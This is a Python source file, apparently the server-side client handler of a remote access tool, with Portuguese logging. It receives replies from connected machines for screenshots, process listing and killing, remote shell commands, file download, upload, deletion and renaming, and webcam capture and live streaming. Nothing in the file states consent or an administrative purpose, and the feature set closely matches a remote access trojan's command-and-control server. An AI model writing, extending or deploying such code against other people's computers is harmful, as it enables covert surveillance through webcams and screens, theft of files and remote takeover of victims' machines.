# server/handlers/client_handler.py
import socket
import threading
import json
import time
import logging
import struct
import base64
import traceback
from io import BytesIO
from PIL import Image
from core.protocol import *
logger = logging.getLogger("server.client_handler")
class ClientHandler:
    def __init__(self, server, client_socket, client_address):
        self.server = server
        self.client_socket = client_socket
        self.client_address = client_address
        self.client_key = f"{client_address[0]}:{client_address[1]}"
        self.running = True
        self.client_info = {}
        self.update_pending = False
        self.last_ui_update = 0
        self.UI_UPDATE_INTERVAL = 0.5
        self.logger = logging.getLogger(f"client.{self.client_key}")
    def log(self, message):
        log_msg = f"[Cliente {self.client_key}] {message}"
        self.server.log(log_msg)
    def start(self):
        self.log("Iniciando thread de cliente")
        client_thread = threading.Thread(target=self.handle)
        client_thread.daemon = True
        client_thread.start()
    def stop(self):
        self.log("Parando manipulador de cliente")
        self.running = False
        try:
            self.client_socket.close()
        except Exception as e:
            self.log(f"Erro ao fechar socket: {str(e)}")
        self.log("Manipulador de cliente parado")
    def handle(self):
        try:
            self.server.connection_manager.client_sockets[self.client_address] = self.client_socket
            initial_data = self.client_socket.recv(8192)
            if not initial_data:
                self.log("Nenhum dado inicial recebido")
                return
            try:
                self.client_info = json.loads(initial_data.decode('utf-8'))
                self.server.connection_manager.clients[self.client_address] = self.client_info
                if self.server.update_ui_callback:
                    self.server.update_ui_callback()
                self.log(f"Informações iniciais recebidas: {self.client_info.get('hostname', 'Desconhecido')}")
                self.client_socket.send(json.dumps({"status": "connected"}).encode('utf-8'))
                self._communication_loop()
            except json.JSONDecodeError as e:
                self.log(f"Erro ao decodificar dados iniciais: {str(e)}")
            except Exception as e:
                self.log(f"Erro ao processar dados iniciais: {str(e)}")
        except Exception as e:
            if self.running:
                self.log(f"Erro não tratado: {str(e)}")
        finally:
            self.cleanup()
    def _communication_loop(self):
        while self.running:
            try:
                self.client_socket.settimeout(0.5)
                cmd_data = self.client_socket.recv(4)
                if not cmd_data:
                    self.log("Cliente desconectado (conexão fechada)")
                    break
                if len(cmd_data) == 4:
                    cmd = struct.unpack('>I', cmd_data)[0]
                    self._process_binary_command(cmd)
                else:
                    self._process_legacy_command(cmd_data)
                self._check_ui_update()
            except socket.timeout:
                self._check_ui_update()
                continue
            except ConnectionError as e:
                self.log(f"Erro de conexão: {str(e)}")
                break
            except Exception as e:
                if self.running:
                    self.log(f"Erro durante comunicação: {str(e)}")
                break
    def _check_ui_update(self):
        current_time = time.time()
        if self.update_pending and (current_time - self.last_ui_update) >= self.UI_UPDATE_INTERVAL:
            if self.server.update_ui_callback:
                self.server.update_ui_callback()
            self.update_pending = False
            self.last_ui_update = current_time
    def _process_binary_command(self, cmd):
        if cmd == CMD_UPDATE:
            self._process_update_command()
        elif cmd == CMD_PING:
            self._send_binary_command(CMD_PONG)
        elif cmd == CMD_PONG:
            pass
        elif cmd == CMD_SCREENSHOT_RESPONSE:
            self._process_screenshot()
        elif cmd == CMD_PROCESS_LIST_RESPONSE:
            self._process_process_list()
        elif cmd == CMD_PROCESS_KILL_RESPONSE:
            self._process_kill_response()
        elif cmd == CMD_SHELL_RESPONSE:
            self._process_shell_response()
        elif cmd == CMD_FILE_LIST_RESPONSE:
            self._process_file_list_response()
        elif cmd == CMD_FILE_DOWNLOAD_RESPONSE:
            self._process_file_download_response()
        elif cmd == CMD_FILE_UPLOAD_RESPONSE:
            self._process_file_upload_response()
        elif cmd == CMD_FILE_DELETE_RESPONSE:
            self._process_file_delete_response()
        elif cmd == CMD_FILE_RENAME_RESPONSE:
            self._process_file_rename_response()
        elif cmd == CMD_FILE_MKDIR_RESPONSE:
            self._process_file_mkdir_response()
        elif cmd == CMD_WEBCAM_LIST_RESPONSE:
            self._process_webcam_list_response()
        elif cmd == CMD_WEBCAM_CAPTURE_RESPONSE:
            self._process_webcam_capture_response()
        elif cmd == CMD_WEBCAM_STREAM_START:
            self._process_webcam_stream_start_response()
        elif cmd == CMD_WEBCAM_STREAM_STOP:
            self._process_webcam_stream_stop_response()
        else:
            if cmd > 100:  # Assumimos que comandos acima de 100 podem ser dados de arquivo
                pass  # Silenciosamente ignorar
            else:
                self.log(f"Comando binário desconhecido: {cmd}")
    def _process_update_command(self):
        size_data = self._recv_exact(4)
        if not size_data:
            self.log("Erro ao receber tamanho dos dados de atualização")
            return
        data_size = struct.unpack('>I', size_data)[0]
        data = self._recv_exact(data_size)
        if not data:
            self.log("Erro ao receber dados de atualização")
            return
        try:
            update_data = json.loads(data.decode('utf-8'))
            changed = False
            if "cpu_usage" in update_data and self.client_info.get("cpu_usage") != update_data["cpu_usage"]:
                self.client_info["cpu_usage"] = update_data["cpu_usage"]
                self.server.connection_manager.clients[self.client_address]["cpu_usage"] = update_data["cpu_usage"]
                changed = True
            if "ram_usage" in update_data and self.client_info.get("ram_usage") != update_data["ram_usage"]:
                self.client_info["ram_usage"] = update_data["ram_usage"]
                self.server.connection_manager.clients[self.client_address]["ram_usage"] = update_data["ram_usage"]
                changed = True
            if changed:
                self.update_pending = True
        except json.JSONDecodeError as e:
            self.log(f"Erro ao decodificar dados de atualização: {str(e)}")
        except Exception as e:
            self.log(f"Erro ao processar dados de atualização: {str(e)}")
    def _process_screenshot(self):
        self.log("Recebendo dados de captura de tela")
        size_data = self._recv_exact(4)
        if not size_data:
            self.log("Erro ao receber tamanho da captura de tela")
            return
        data_size = struct.unpack('>I', size_data)[0]
        if data_size <= 0:
            self.log(f"Tamanho da imagem inválido: {data_size} bytes")
            return
        if data_size > 10 * 1024 * 1024:
            self.log(f"Tamanho da imagem muito grande: {data_size / 1024 / 1024:.2f} MB")
            return
        self.log(f"Tamanho da imagem: {data_size / 1024:.2f} KB")
        image_data = self._recv_exact(data_size, timeout=60)
        if not image_data:
            self.log("Erro ao receber dados da imagem")
            return
        if len(image_data) != data_size:
            self.log(f"Tamanho recebido ({len(image_data)}) difere do esperado ({data_size})")
            return
        threading.Thread(
            target=self._process_image_data,
            args=(image_data,),
            daemon=True
        ).start()
    def _process_process_list(self):
        self.log("Recebendo lista de processos")
        size_data = self._recv_exact(4)
        if not size_data:
            self.log("Erro ao receber tamanho da lista de processos")
            return
        data_size = struct.unpack('>I', size_data)[0]
        if data_size <= 0:
            self.log(f"Tamanho da lista de processos inválido: {data_size} bytes")
            return
        if data_size > 10 * 1024 * 1024:
            self.log(f"Tamanho da lista de processos muito grande: {data_size / 1024 / 1024:.2f} MB")
            return
        self.log(f"Tamanho da lista de processos: {data_size / 1024:.2f} KB")
        process_data = self._recv_exact(data_size)
        if not process_data:
            self.log("Erro ao receber lista de processos")
            return
        try:
            process_list = json.loads(process_data.decode('utf-8'))
            self.log(f"Recebida lista com {len(process_list)} processos")
            if self.server.process_list_callback:
                self.server.process_list_callback(self.client_address, process_list)
        except json.JSONDecodeError as e:
            self.log(f"Erro ao decodificar lista de processos: {str(e)}")
        except Exception as e:
            self.log(f"Erro ao processar lista de processos: {str(e)}")
    def _process_kill_response(self):
        self.log("Recebendo resposta de encerramento de processo")
        size_data = self._recv_exact(4)
        if not size_data:
            self.log("Erro ao receber tamanho da resposta de encerramento")
            return
        data_size = struct.unpack('>I', size_data)[0]
        data = self._recv_exact(data_size)
        if not data:
            self.log("Erro ao receber dados da resposta de encerramento")
            return
        try:
            response = data.decode('utf-8')
            self.log(f"Resposta de encerramento de processo: {response}")
            if self.server.command_processor:
                self.server.command_processor.process_kill_response(self, data_size, data)
        except Exception as e:
            self.log(f"Erro ao processar resposta de encerramento: {str(e)}")
    def _process_shell_response(self):
        try:
            logger.info("Recebendo resposta de comando shell")
            size_data = self._recv_exact(4)
            if not size_data:
                logger.error("Erro ao receber tamanho da resposta da shell")
                return
            data_size = struct.unpack('>I', size_data)[0]
            data = self._recv_exact(data_size)
            if not data:
                logger.error("Erro ao receber dados da resposta da shell")
                return
            if hasattr(self.server, 'window_manager') and self.server.window_manager:
                logger.debug("Processando resposta da shell via window_manager")
                self.server.window_manager.process_shell_response(self.client_address, data)
                return
            if hasattr(self.server, 'shell_response_callback') and self.server.shell_response_callback:
                logger.debug("Processando resposta da shell via callback")
                self.server.shell_response_callback(self.client_address, data)
                return
            if hasattr(self.server, 'command_processor') and self.server.command_processor:
                logger.debug("Processando resposta da shell via command_processor")
                self.server.command_processor.process_shell_response(self, data_size, data)
                return
            self.log(f"Nenhum handler disponível para processar resposta da shell")
        except Exception as e:
            logger.error(f"Erro ao processar resposta da shell: {str(e)}")
    def _process_image_data(self, image_data):
        try:
            is_valid_image = self._validate_image_format(image_data)
            if not is_valid_image:
                self.log("Formato de imagem inválido")
                return
            screenshot_b64 = base64.b64encode(image_data).decode('utf-8')
            if self.server.screenshot_callback:
                self.server.screenshot_callback(self.client_address, screenshot_b64)
                self.log("Captura de tela processada com sucesso")
        except Exception as e:
            self.log(f"Erro ao processar imagem: {str(e)}")
            try:
                screenshot_b64 = base64.b64encode(image_data).decode('utf-8')
                if self.server.screenshot_callback:
                    self.server.screenshot_callback(self.client_address, screenshot_b64)
                    self.log("Captura de tela enviada após falha na verificação")
            except Exception as e2:
                self.log(f"Erro final ao processar imagem: {str(e2)}")
    def _validate_image_format(self, image_data):
        is_jpeg = len(image_data) >= 2 and image_data[0] == 0xFF and image_data[1] == 0xD8
        is_png = (len(image_data) >= 4 and 
                 image_data[0] == 0x89 and 
                 image_data[1] == 0x50 and 
                 image_data[2] == 0x4E and 
                 image_data[3] == 0x47)
        if is_jpeg:
            self.log("Formato de imagem: JPEG")
        elif is_png:
            self.log("Formato de imagem: PNG")
        else:
            self.log("AVISO: Formato de imagem não reconhecido")
        return True
    def _process_legacy_command(self, initial_data):
        try:
            data_str = initial_data.decode('utf-8', errors='ignore')
            while True:
                try:
                    json_data = json.loads(data_str)
                    break
                except json.JSONDecodeError:
                    self.client_socket.settimeout(0.5)
                    try:
                        chunk = self.client_socket.recv(4096)
                        if not chunk:
                            self.log("Cliente desconectado durante recebimento de JSON")
                            return
                        data_str += chunk.decode('utf-8', errors='ignore')
                    except socket.timeout:
                        self.log("Timeout ao receber JSON completo")
                        return
            if "action" in json_data:
                action = json_data["action"]
                if action == "update":
                    changed = False
                    if "cpu_usage" in json_data and self.client_info.get("cpu_usage") != json_data["cpu_usage"]:
                        self.client_info["cpu_usage"] = json_data["cpu_usage"]
                        self.server.connection_manager.clients[self.client_address]["cpu_usage"] = json_data["cpu_usage"]
                        changed = True
                    if "ram_usage" in json_data and self.client_info.get("ram_usage") != json_data["ram_usage"]:
                        self.client_info["ram_usage"] = json_data["ram_usage"]
                        self.server.connection_manager.clients[self.client_address]["ram_usage"] = json_data["ram_usage"]
                        changed = True
                    if changed:
                        self.update_pending = True
                elif action == "screenshot":
                    self.log("Recebido pedido de screenshot no formato legado - não mais suportado")
                else:
                    self.log(f"Ação desconhecida: {action}")
            else:
                self.log("Comando JSON sem ação específica")
        except Exception as e:
            self.log(f"Erro ao processar comando legado: {str(e)}")
    def _recv_exact(self, size, timeout=30):
        original_timeout = self.client_socket.gettimeout()
        try:
            self.client_socket.settimeout(timeout)
            data = b""
            bytes_remaining = size
            while bytes_remaining > 0:
                chunk = self.client_socket.recv(min(bytes_remaining, 8192))
                if not chunk:
                    return None
                data += chunk
                bytes_remaining -= len(chunk)
            return data
        except socket.timeout:
            self.log(f"Timeout ao receber dados ({timeout}s)")
            return None
        except Exception as e:
            self.log(f"Erro ao receber dados: {str(e)}")
            return None
        finally:
            self.client_socket.settimeout(original_timeout)
    def request_process_list(self, detailed=False):
        try:
            self.log(f"Solicitando lista de processos")
            params = {"detailed": detailed}
            params_json = json.dumps(params).encode('utf-8')
            return self._send_binary_command(CMD_PROCESS_LIST, params_json)
        except Exception as e:
            self.log(f"Erro ao solicitar lista de processos: {str(e)}")
            return False
    def request_kill_process(self, pid):
        try:
            self.log(f"Solicitando encerramento do processo {pid}")
            pid_str = str(pid).encode('utf-8')
            return self._send_binary_command(CMD_PROCESS_KILL, pid_str)
        except Exception as e:
            self.log(f"Erro ao solicitar encerramento do processo {pid}: {str(e)}")
            return False
    def send_command(self, command_data):
        try:
            if isinstance(command_data, dict):
                if command_data.get("action") == "screenshot":
                    self.log("Enviando comando para captura única")
                    return self._send_binary_command(CMD_SCREENSHOT_SINGLE)
                json_data = json.dumps(command_data).encode('utf-8')
                self.client_socket.sendall(json_data)
                return True
            else:
                self.log("Formato de comando inválido")
                return False
        except Exception as e:
            self.log(f"Erro ao enviar comando: {str(e)}")
            return False
    def _send_binary_command(self, cmd, data=None):
        try:
            header = struct.pack('>I', cmd)
            if data:
                size = struct.pack('>I', len(data))
                self.client_socket.sendall(header + size + data)
            else:
                self.client_socket.sendall(header)
            return True
        except ConnectionError as e:
            self.log(f"Erro de conexão ao enviar comando: {str(e)}")
            return False
        except Exception as e:
            self.log(f"Erro ao enviar comando: {str(e)}")
            return False
    def cleanup(self):
        self.log("Limpando recursos do cliente")
        if self.client_address in self.server.connection_manager.clients:
            del self.server.connection_manager.clients[self.client_address]
        if self.client_address in self.server.connection_manager.client_sockets:
            try:
                self.server.connection_manager.client_sockets[self.client_address].close()
            except:
                pass
            del self.server.connection_manager.client_sockets[self.client_address]
        if self.client_address in self.server.connection_manager.client_handlers:
            del self.server.connection_manager.client_handlers[self.client_address]
        if self.server.is_running and self.server.update_ui_callback:
            self.server.update_ui_callback()
        self.log("Recursos do cliente limpos")
    def _process_file_list_response(self):
        try:
            logger.info("Recebendo resposta de listagem de diretório")
            size_data = self._recv_exact(4)
            if not size_data:
                logger.error("Falha ao ler o tamanho da resposta de listagem")
                return
            data_size = struct.unpack('>I', size_data)[0]
            if data_size <= 0:
                logger.error(f"Tamanho da resposta de listagem inválido: {data_size} bytes")
                return
            data = self._recv_exact(data_size)
            if not data:
                logger.error("Erro ao receber dados da resposta de listagem")
                return
            logger.info(f"Recebidos {len(data)} bytes de dados de listagem")
            if self.server.file_response_callback:
                self.server.file_response_callback(self.client_address, CMD_FILE_LIST_RESPONSE, data)
                logger.info("Callback de resposta de arquivo processado")
            else:
                logger.warning("Sem callback para processar resposta de arquivo")
        except Exception as e:
            traceback.print_exc()
            logger.error(f"Erro ao processar resposta de listagem: {str(e)}")
    def _process_file_download_response(self):
        try:
            logger.info("Recebendo resposta de download de arquivo")
            size_data = self._recv_exact(4)
            if not size_data:
                logger.error("Erro ao receber tamanho da resposta de download")
                return
            data_size = struct.unpack('>I', size_data)[0]
            if data_size <= 0:
                logger.error(f"Tamanho da resposta de download inválido: {data_size} bytes")
                return
            if data_size > 100 * 1024 * 1024:  # Limite de 100MB
                logger.error(f"Tamanho da resposta de download muito grande: {data_size/1024/1024:.2f} MB")
                return
            logger.info(f"Recebendo {data_size/1024:.2f} KB de dados de download")
            data = self._recv_exact(data_size, timeout=120)  # Aumentado timeout para arquivos grandes
            if not data:
                logger.error("Erro ao receber dados da resposta de download")
                return
            logger.info(f"Recebidos {len(data)} bytes de dados de download")
            if self.server.file_response_callback:
                self.server.file_response_callback(self.client_address, CMD_FILE_DOWNLOAD_RESPONSE, data)
                logger.info("Callback de resposta de download processado")
            else:
                logger.warning("Sem callback para processar resposta de download")
        except Exception as e:
            logger.error(f"Erro ao processar resposta de download: {str(e)}")
    def _process_file_upload_response(self):
        try:
            logger.info("Recebendo resposta de upload de arquivo")
            size_data = self._recv_exact(4)
            if not size_data:
                logger.error("Erro ao receber tamanho da resposta de upload")
                return
            data_size = struct.unpack('>I', size_data)[0]
            if data_size <= 0:
                logger.error(f"Tamanho da resposta de upload inválido: {data_size} bytes")
                return
            if data_size > 1024:
                logger.info(f"Recebendo {data_size} bytes de resposta de upload")
            data = self._recv_exact(data_size)
            if not data:
                logger.error("Erro ao receber dados da resposta de upload")
                return
            try:
                is_json = False
                sample = data[:100]
                if len(sample) > 0 and sample[0:1] == b'{':
                    try:
                        sample_decoded = sample.decode('utf-8', errors='ignore')
                        if '{' in sample_decoded and '"' in sample_decoded:
                            is_json = True
                    except:
                        pass
                if is_json:
                    try:
                        response_json = json.loads(data.decode('utf-8', errors='replace'))
                        logger.info(f"Resposta de upload JSON: {response_json}")
                    except Exception as e:
                        logger.warning(f"Não foi possível decodificar resposta completa como JSON: {str(e)}")
                else:
                    logger.info(f"Resposta de upload não-JSON recebida ({len(data)} bytes)")
            except Exception as e:
                logger.warning(f"Erro ao analisar amostra da resposta: {str(e)}")
            if self.server.file_response_callback:
                self.server.file_response_callback(self.client_address, CMD_FILE_UPLOAD_RESPONSE, data)
                logger.info("Callback de resposta de upload processado")
            else:
                logger.warning("Sem callback para processar resposta de upload")
        except Exception as e:
            traceback.print_exc()
            logger.error(f"Erro ao processar resposta de upload: {str(e)}")
    def _process_file_delete_response(self):
        try:
            logger.info("Recebendo resposta de exclusão de arquivo")
            size_data = self._recv_exact(4)
            if not size_data:
                logger.error("Erro ao receber tamanho da resposta de exclusão")
                return
            data_size = struct.unpack('>I', size_data)[0]
            if data_size <= 0:
                logger.error(f"Tamanho da resposta de exclusão inválido: {data_size} bytes")
                return
            data = self._recv_exact(data_size)
            if not data:
                logger.error("Erro ao receber dados da resposta de exclusão")
                return
            logger.info(f"Recebidos {len(data)} bytes de resposta de exclusão")
            if self.server.file_response_callback:
                self.server.file_response_callback(self.client_address, CMD_FILE_DELETE_RESPONSE, data)
                logger.info("Callback de resposta de exclusão processado")
            else:
                logger.warning("Sem callback para processar resposta de exclusão")
        except Exception as e:
            traceback.print_exc()
            logger.error(f"Erro ao processar resposta de exclusão: {str(e)}")
    def _process_file_rename_response(self):
        try:
            logger.info("Recebendo resposta de renomeação de arquivo")
            size_data = self._recv_exact(4)
            if not size_data:
                logger.error("Erro ao receber tamanho da resposta de renomeação")
                return
            data_size = struct.unpack('>I', size_data)[0]
            if data_size <= 0:
                logger.error(f"Tamanho da resposta de renomeação inválido: {data_size} bytes")
                return
            data = self._recv_exact(data_size)
            if not data:
                logger.error("Erro ao receber dados da resposta de renomeação")
                return
            logger.info(f"Recebidos {len(data)} bytes de resposta de renomeação")
            if self.server.file_response_callback:
                self.server.file_response_callback(self.client_address, CMD_FILE_RENAME_RESPONSE, data)
                logger.info("Callback de resposta de renomeação processado")
            else:
                logger.warning("Sem callback para processar resposta de renomeação")
        except Exception as e:
            traceback.print_exc()
            logger.error(f"Erro ao processar resposta de renomeação: {str(e)}")
    def _process_file_mkdir_response(self):
        try:
            logger.info("Recebendo resposta de criação de diretório")
            size_data = self._recv_exact(4)
            if not size_data:
                logger.error("Erro ao receber tamanho da resposta de criação de diretório")
                return
            data_size = struct.unpack('>I', size_data)[0]
            if data_size <= 0:
                logger.error(f"Tamanho da resposta de criação de diretório inválido: {data_size} bytes")
                return
            data = self._recv_exact(data_size)
            if not data:
                logger.error("Erro ao receber dados da resposta de criação de diretório")
                return
            logger.info(f"Recebidos {len(data)} bytes de resposta de criação de diretório")
            if self.server.file_response_callback:
                self.server.file_response_callback(self.client_address, CMD_FILE_MKDIR_RESPONSE, data)
                logger.info("Callback de resposta de criação de diretório processado")
            else:
                logger.warning("Sem callback para processar resposta de criação de diretório")
        except Exception as e:
            traceback.print_exc()
            logger.error(f"Erro ao processar resposta de criação de diretório: {str(e)}")
    def _process_webcam_list_response(self):
        self.log("Recebendo lista de webcams")
        size_data = self._recv_exact(4)
        if not size_data:
            self.log("Erro ao receber tamanho da lista de webcams")
            return
        data_size = struct.unpack('>I', size_data)[0]
        data = self._recv_exact(data_size)
        if not data:
            self.log("Erro ao receber dados da lista de webcams")
            return
        try:
            if hasattr(self.server, 'process_webcam_response'):
                self.server.process_webcam_response(self.client_address, CMD_WEBCAM_LIST_RESPONSE, data)
            else:
                self.log("Servidor não possui método para processar resposta de webcam")
        except Exception as e:
            self.log(f"Erro ao processar lista de webcams: {str(e)}")
    def _process_webcam_capture_response(self):
        self.log("Recebendo captura de webcam")
        try:
            header_size_data = self._recv_exact(4)
            if not header_size_data:
                self.log("Erro ao receber tamanho do cabeçalho da webcam")
                return
            header_size = struct.unpack('>I', header_size_data)[0]
            if header_size <= 0 or header_size > 1024 * 1024:  # Limite de 1MB para o cabeçalho
                self.log(f"Tamanho do cabeçalho da webcam inválido: {header_size}")
                return
            header_data = self._recv_exact(header_size)
            if not header_data:
                self.log("Erro ao receber cabeçalho da webcam")
                return
            try:
                header = json.loads(header_data.decode('utf-8'))
                camera_id = header.get('camera_id', 0)
                self.log(f"Recebendo imagem da câmera {camera_id}")
            except:
                self.log("Aviso: Não foi possível decodificar o cabeçalho da webcam")
            img_size_data = self._recv_exact(4)
            if not img_size_data:
                self.log("Erro ao receber tamanho da imagem da webcam")
                return
            img_size = struct.unpack('>I', img_size_data)[0]
            if img_size <= 0 or img_size > 10 * 1024 * 1024:  # Limite de 10MB
                self.log(f"Tamanho da imagem da webcam inválido: {img_size}")
                return
            img_data = self._recv_exact(img_size, timeout=10)
            if not img_data:
                self.log("Erro ao receber dados da imagem da webcam")
                return
            combined_data = header_size_data + header_data + img_size_data + img_data
            if hasattr(self.server, 'process_webcam_response'):
                self.server.process_webcam_response(self.client_address, CMD_WEBCAM_CAPTURE_RESPONSE, combined_data)
            else:
                self.log("Servidor não possui método para processar resposta de webcam")
        except Exception as e:
            self.log(f"Erro ao processar captura de webcam: {str(e)}")
    def _process_webcam_stream_start_response(self):
        self.log("Recebendo resposta de início de streaming de webcam")
        size_data = self._recv_exact(4)
        if not size_data:
            self.log("Erro ao receber tamanho da resposta de streaming")
            return
        data_size = struct.unpack('>I', size_data)[0]
        data = self._recv_exact(data_size)
        if not data:
            self.log("Erro ao receber dados da resposta de streaming")
            return
        try:
            if hasattr(self.server, 'process_webcam_response'):
                self.server.process_webcam_response(self.client_address, CMD_WEBCAM_STREAM_START, data)
            else:
                self.log("Servidor não possui método para processar resposta de webcam")
        except Exception as e:
            self.log(f"Erro ao processar resposta de início de streaming: {str(e)}")
    def _process_webcam_stream_stop_response(self):
        self.log("Recebendo resposta de parada de streaming de webcam")
        size_data = self._recv_exact(4)
        if not size_data:
            self.log("Erro ao receber tamanho da resposta de parada de streaming")
            return
        data_size = struct.unpack('>I', size_data)[0]
        data = self._recv_exact(data_size)
        if not data:
            self.log("Erro ao receber dados da resposta de parada de streaming")
            return
        try:
            if hasattr(self.server, 'process_webcam_response'):
                self.server.process_webcam_response(self.client_address, CMD_WEBCAM_STREAM_STOP, data)
            else:
                self.log("Servidor não possui método para processar resposta de webcam")
        except Exception as e:
            self.log(f"Erro ao processar resposta de parada de streaming: {str(e)}")
